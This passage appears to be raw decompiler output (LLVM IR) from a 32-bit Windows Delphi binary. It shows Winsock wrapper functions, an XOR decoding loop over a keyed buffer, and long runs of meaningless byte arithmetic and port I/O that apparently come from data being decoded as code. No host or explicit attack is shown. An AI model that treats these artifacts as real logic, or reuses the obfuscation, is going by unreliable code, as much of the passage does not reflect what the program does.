  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404810:
  %esi.01.reg2mem = alloca i32, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = xor i32 %3, %1, !insn.addr !322
  %5 = trunc i32 %3 to i16, !insn.addr !323
  %6 = call i32 @__readfsdword(i32 %4), !insn.addr !323
  call void @__asm_outsd(i16 %5, i32 %6), !insn.addr !323
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !324
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !324
  %11 = add i8 %8, %10, !insn.addr !324
  %12 = inttoptr i32 %9 to i8*, !insn.addr !324
  store i8 %11, i8* %12, align 1, !insn.addr !324
  %13 = load i8, i8* %7, align 4, !insn.addr !325
  %14 = load i32, i32* %eax, align 4
  %15 = trunc i32 %14 to i8, !insn.addr !325
  %16 = add i8 %13, %15, !insn.addr !325
  %17 = inttoptr i32 %14 to i8*, !insn.addr !325
  store i8 %16, i8* %17, align 1, !insn.addr !325
  %18 = load i8, i8* %7, align 4, !insn.addr !326
  %19 = load i32, i32* %eax, align 4
  %20 = trunc i32 %19 to i8, !insn.addr !326
  %21 = add i8 %18, %20, !insn.addr !326
  %22 = inttoptr i32 %19 to i8*, !insn.addr !326
  store i8 %21, i8* %22, align 1, !insn.addr !326
  %23 = load i8, i8* %7, align 4, !insn.addr !327
  %24 = load i32, i32* %eax, align 4
  %25 = trunc i32 %24 to i8, !insn.addr !327
  %26 = add i8 %23, %25, !insn.addr !327
  %27 = inttoptr i32 %24 to i8*, !insn.addr !327
  store i8 %26, i8* %27, align 1, !insn.addr !327
  %28 = load i8, i8* %7, align 4, !insn.addr !328
  %29 = load i32, i32* %eax, align 4
  %30 = trunc i32 %29 to i8, !insn.addr !328
  %31 = add i8 %28, %30, !insn.addr !328
  %32 = inttoptr i32 %29 to i8*, !insn.addr !328
  store i8 %31, i8* %32, align 1, !insn.addr !328
  %33 = load i8, i8* %7, align 4, !insn.addr !329
  %34 = load i32, i32* %eax, align 4
  %35 = trunc i32 %34 to i8, !insn.addr !329
  %36 = add i8 %33, %35, !insn.addr !329
  %37 = inttoptr i32 %34 to i8*, !insn.addr !329
  store i8 %36, i8* %37, align 1, !insn.addr !329
  %38 = load i8, i8* %7, align 4, !insn.addr !330
  %39 = load i32, i32* %eax, align 4
  %40 = trunc i32 %39 to i8, !insn.addr !330
  %41 = add i8 %38, %40, !insn.addr !330
  %42 = inttoptr i32 %39 to i8*, !insn.addr !330
  store i8 %41, i8* %42, align 1, !insn.addr !330
  %43 = load i8, i8* %7, align 4, !insn.addr !331
  %44 = load i32, i32* %eax, align 4
  %45 = trunc i32 %44 to i8, !insn.addr !331
  %46 = add i8 %43, %45, !insn.addr !331
  %47 = inttoptr i32 %44 to i8*, !insn.addr !331
  store i8 %46, i8* %47, align 1, !insn.addr !331
  %48 = load i8, i8* %7, align 4, !insn.addr !332
  %49 = load i32, i32* %eax, align 4
  %50 = trunc i32 %49 to i8, !insn.addr !332
  %51 = add i8 %48, %50, !insn.addr !332
  %52 = inttoptr i32 %49 to i8*, !insn.addr !332
  store i8 %51, i8* %52, align 1, !insn.addr !332
  %53 = load i8, i8* %7, align 4, !insn.addr !333
  %54 = load i32, i32* %eax, align 4
  %55 = trunc i32 %54 to i8, !insn.addr !333
  %56 = add i8 %53, %55, !insn.addr !333
  %57 = inttoptr i32 %54 to i8*, !insn.addr !333
  store i8 %56, i8* %57, align 1, !insn.addr !333
  %58 = load i8, i8* %7, align 4, !insn.addr !334
  %59 = load i32, i32* %eax, align 4
  %60 = trunc i32 %59 to i8, !insn.addr !334
  %61 = add i8 %58, %60, !insn.addr !334
  %62 = inttoptr i32 %59 to i8*, !insn.addr !334
  store i8 %61, i8* %62, align 1, !insn.addr !334
  %63 = load i8, i8* %7, align 4, !insn.addr !335
  %64 = load i32, i32* %eax, align 4
  %65 = trunc i32 %64 to i8, !insn.addr !335
  %66 = add i8 %63, %65, !insn.addr !335
  %67 = inttoptr i32 %64 to i8*, !insn.addr !335
  store i8 %66, i8* %67, align 1, !insn.addr !335
  %68 = load i8, i8* %7, align 4, !insn.addr !336
  %69 = load i32, i32* %eax, align 4
  %70 = trunc i32 %69 to i8, !insn.addr !336
  %71 = add i8 %68, %70, !insn.addr !336
  %72 = inttoptr i32 %69 to i8*, !insn.addr !336
  store i8 %71, i8* %72, align 1, !insn.addr !336
  %73 = load i8, i8* %7, align 4, !insn.addr !337
  %74 = load i32, i32* %eax, align 4
  %75 = trunc i32 %74 to i8, !insn.addr !337
  %76 = add i8 %73, %75, !insn.addr !337
  %77 = inttoptr i32 %74 to i8*, !insn.addr !337
  store i8 %76, i8* %77, align 1, !insn.addr !337
  %78 = load i8, i8* %7, align 4, !insn.addr !338
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !338
  %81 = add i8 %78, %80, !insn.addr !338
  %82 = inttoptr i32 %79 to i8*, !insn.addr !338
  store i8 %81, i8* %82, align 1, !insn.addr !338
  %83 = load i8, i8* %7, align 4, !insn.addr !339
  %84 = load i32, i32* %eax, align 4
  %85 = trunc i32 %84 to i8, !insn.addr !339
  %86 = add i8 %83, %85, !insn.addr !339
  %87 = inttoptr i32 %84 to i8*, !insn.addr !339
  store i8 %86, i8* %87, align 1, !insn.addr !339
  %88 = load i8, i8* %7, align 4, !insn.addr !340
  %89 = load i32, i32* %eax, align 4
  %90 = trunc i32 %89 to i8, !insn.addr !340
  %91 = add i8 %88, %90, !insn.addr !340
  %92 = inttoptr i32 %89 to i8*, !insn.addr !340
  store i8 %91, i8* %92, align 1, !insn.addr !340
  %93 = load i8, i8* %7, align 4, !insn.addr !341
  %94 = load i32, i32* %eax, align 4
  %95 = trunc i32 %94 to i8, !insn.addr !341
  %96 = add i8 %93, %95, !insn.addr !341
  %97 = inttoptr i32 %94 to i8*, !insn.addr !341
  store i8 %96, i8* %97, align 1, !insn.addr !341
  %98 = load i8, i8* %7, align 4, !insn.addr !342
  %99 = load i32, i32* %eax, align 4
  %100 = trunc i32 %99 to i8, !insn.addr !342
  %101 = add i8 %98, %100, !insn.addr !342
  %102 = inttoptr i32 %99 to i8*, !insn.addr !342
  store i8 %101, i8* %102, align 1, !insn.addr !342
  %103 = load i8, i8* %7, align 4, !insn.addr !343
  %104 = load i32, i32* %eax, align 4
  %105 = trunc i32 %104 to i8, !insn.addr !343
  %106 = add i8 %103, %105, !insn.addr !343
  %107 = inttoptr i32 %104 to i8*, !insn.addr !343
  store i8 %106, i8* %107, align 1, !insn.addr !343
  %108 = load i8, i8* %7, align 4, !insn.addr !344
  %109 = load i32, i32* %eax, align 4
  %110 = trunc i32 %109 to i8, !insn.addr !344
  %111 = add i8 %108, %110, !insn.addr !344
  %112 = inttoptr i32 %109 to i8*, !insn.addr !344
  store i8 %111, i8* %112, align 1, !insn.addr !344
  %113 = load i8, i8* %7, align 4, !insn.addr !345
  %114 = load i32, i32* %eax, align 4
  %115 = trunc i32 %114 to i8, !insn.addr !345
  %116 = add i8 %113, %115, !insn.addr !345
  %117 = inttoptr i32 %114 to i8*, !insn.addr !345
  store i8 %116, i8* %117, align 1, !insn.addr !345
  %118 = load i8, i8* %7, align 4, !insn.addr !346
  %119 = load i32, i32* %eax, align 4
  %120 = trunc i32 %119 to i8, !insn.addr !346
  %121 = add i8 %118, %120, !insn.addr !346
  %122 = inttoptr i32 %119 to i8*, !insn.addr !346
  store i8 %121, i8* %122, align 1, !insn.addr !346
  %123 = load i8, i8* %7, align 4, !insn.addr !347
  %124 = load i32, i32* %eax, align 4
  %125 = trunc i32 %124 to i8, !insn.addr !347
  %126 = add i8 %123, %125, !insn.addr !347
  %127 = inttoptr i32 %124 to i8*, !insn.addr !347
  store i8 %126, i8* %127, align 1, !insn.addr !347
  %128 = load i8, i8* %7, align 4, !insn.addr !348
  %129 = load i32, i32* %eax, align 4
  %130 = trunc i32 %129 to i8, !insn.addr !348
  %131 = add i8 %128, %130, !insn.addr !348
  %132 = inttoptr i32 %129 to i8*, !insn.addr !348
  store i8 %131, i8* %132, align 1, !insn.addr !348
  %133 = load i8, i8* %7, align 4, !insn.addr !349
  %134 = load i32, i32* %eax, align 4
  %135 = trunc i32 %134 to i8, !insn.addr !349
  %136 = add i8 %133, %135, !insn.addr !349
  %137 = inttoptr i32 %134 to i8*, !insn.addr !349
  store i8 %136, i8* %137, align 1, !insn.addr !349
  %138 = load i8, i8* %7, align 4, !insn.addr !350
  %139 = load i32, i32* %eax, align 4
  %140 = trunc i32 %139 to i8, !insn.addr !350
  %141 = add i8 %138, %140, !insn.addr !350
  %142 = inttoptr i32 %139 to i8*, !insn.addr !350
  store i8 %141, i8* %142, align 1, !insn.addr !350
  %143 = load i8, i8* %7, align 4, !insn.addr !351
  %144 = load i32, i32* %eax, align 4
  %145 = trunc i32 %144 to i8, !insn.addr !351
  %146 = add i8 %143, %145, !insn.addr !351
  %147 = inttoptr i32 %144 to i8*, !insn.addr !351
  store i8 %146, i8* %147, align 1, !insn.addr !351
  %148 = load i8, i8* %7, align 4, !insn.addr !352
  %149 = load i32, i32* %eax, align 4
  %150 = trunc i32 %149 to i8, !insn.addr !352
  %151 = add i8 %148, %150, !insn.addr !352
  %152 = inttoptr i32 %149 to i8*, !insn.addr !352
  store i8 %151, i8* %152, align 1, !insn.addr !352
  %153 = load i32, i32* %eax, align 4
  %154 = mul i32 %4, 2, !insn.addr !353
  %155 = add i32 %154, 115, !insn.addr !353
  %156 = add i32 %155, %153, !insn.addr !353
  %157 = inttoptr i32 %156 to i8*, !insn.addr !353
  %158 = load i8, i8* %157, align 1, !insn.addr !353
  %159 = udiv i32 %153, 256, !insn.addr !353
  %160 = trunc i32 %159 to i8, !insn.addr !353
  %161 = add i8 %158, %160, !insn.addr !353
  %162 = xor i8 %161, %158, !insn.addr !353
  %163 = xor i8 %161, %160, !insn.addr !353
  %164 = and i8 %162, %163, !insn.addr !353
  %165 = icmp slt i8 %164, 0, !insn.addr !353
  store i8 %161, i8* %157, align 1, !insn.addr !353
  %166 = call i8 @__asm_insb(i16 %5), !insn.addr !354
  %167 = inttoptr i32 %0 to i8*, !insn.addr !354
  store i8 %166, i8* %167, align 1, !insn.addr !354
  br i1 %165, label %dec_label_pc_4048ce, label %dec_label_pc_40485a, !insn.addr !355

dec_label_pc_40485a:                              ; preds = %dec_label_pc_404810
  %168 = icmp slt i8 %161, 0, !insn.addr !353
  %169 = inttoptr i32 %4 to i8*
  %170 = load i8, i8* %169, align 1, !insn.addr !356
  call void @__asm_outsb(i16 %5, i8 %170), !insn.addr !356
  %171 = icmp eq i1 %168, false, !insn.addr !357
  br i1 %171, label %dec_label_pc_40489e.thread, label %dec_label_pc_40485d, !insn.addr !357

dec_label_pc_40489e.thread:                       ; preds = %dec_label_pc_40485a
  %172 = load i8, i8* %169, align 1, !insn.addr !358
  call void @__asm_outsb(i16 %5, i8 %172), !insn.addr !358
  store i32 %4, i32* %esi.01.reg2mem
  br label %dec_label_pc_4048e2

dec_label_pc_40485d:                              ; preds = %dec_label_pc_40485a
  %173 = call i32 @__readfsdword(i32 %1), !insn.addr !359
  call void @__asm_outsd(i16 %5, i32 %173), !insn.addr !359
  %174 = load i8, i8* %7, align 4, !insn.addr !360
  %175 = load i32, i32* %eax, align 4
  %176 = trunc i32 %175 to i8, !insn.addr !360
  %177 = add i8 %174, %176, !insn.addr !360
  %178 = inttoptr i32 %175 to i8*, !insn.addr !360
  store i8 %177, i8* %178, align 1, !insn.addr !360
  %179 = load i8, i8* %7, align 4, !insn.addr !361
  %180 = load i32, i32* %eax, align 4
  %181 = trunc i32 %180 to i8, !insn.addr !361
  %182 = add i8 %179, %181, !insn.addr !361
  %183 = inttoptr i32 %180 to i8*, !insn.addr !361
  store i8 %182, i8* %183, align 1, !insn.addr !361
  %184 = load i8, i8* %7, align 4, !insn.addr !362
  %185 = load i32, i32* %eax, align 4
  %186 = trunc i32 %185 to i8, !insn.addr !362
  %187 = add i8 %184, %186, !insn.addr !362
  %188 = inttoptr i32 %185 to i8*, !insn.addr !362
  store i8 %187, i8* %188, align 1, !insn.addr !362
  %189 = load i8, i8* %7, align 4, !insn.addr !363
  %190 = load i32, i32* %eax, align 4
  %191 = trunc i32 %190 to i8, !insn.addr !363
  %192 = add i8 %189, %191, !insn.addr !363
  %193 = inttoptr i32 %190 to i8*, !insn.addr !363
  store i8 %192, i8* %193, align 1, !insn.addr !363
  %194 = load i8, i8* %7, align 4, !insn.addr !364
  %195 = load i32, i32* %eax, align 4
  %196 = trunc i32 %195 to i8, !insn.addr !364
  %197 = add i8 %194, %196, !insn.addr !364
  %198 = inttoptr i32 %195 to i8*, !insn.addr !364
  store i8 %197, i8* %198, align 1, !insn.addr !364
  %199 = load i8, i8* %7, align 4, !insn.addr !365
  %200 = load i32, i32* %eax, align 4
  %201 = trunc i32 %200 to i8, !insn.addr !365
